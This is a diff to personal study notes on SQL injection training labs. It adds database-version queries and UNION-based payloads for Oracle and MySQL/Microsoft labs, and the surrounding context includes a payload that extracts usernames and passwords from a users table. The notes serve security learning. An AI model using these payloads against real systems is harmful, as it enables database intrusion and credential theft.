@@ -52,6 +52,18 @@ Having already determined the number of required columns, you can probe each col
 ' UNION SELECT NULL,NULL,NULL,'a'--
 
 If the data type of a column is not compatible with string data, the injected query will cause a database error
+
+
+# Database Version
+The queries to determine the database version for some popular database types are as follows:
+
+Database type	Query
+Microsoft, MySQL	`SELECT @@version`
+Oracle	`SELECT * FROM v$version`
+PostgreSQL	`SELECT version()`
+For example, you could use a UNION attack with the following input:
+
+' UNION SELECT @@version--
 ============================================
 ============================================
 Lab: SQL injection UNION attack, determining the number of columns returned by the query
@@ -103,8 +115,25 @@ GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--
 # Extract Usernames and Passwords From Users table
 GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
 ============================================
+Lab: SQL injection attack, querying the database type and version on Oracle
 
+This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+# Determine Number of Columns using dual table (special built in table for Oracle)
+`'+UNION+SELECT+NULL,NULL+FROM+dual--`
+
+# Query to get version info via banner
+`'+UNION+SELECT+BANNER,NULL+FROM+v$version--`
 ============================================
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+# Determine Number of Columns 
+`'+UNION+SELECT+NULL,NULL#`
+
+# Query to get version info via banner
+`'+UNION+SELECT+@@version,+NULL#`
 ============================================
 ============================================
 ============================================
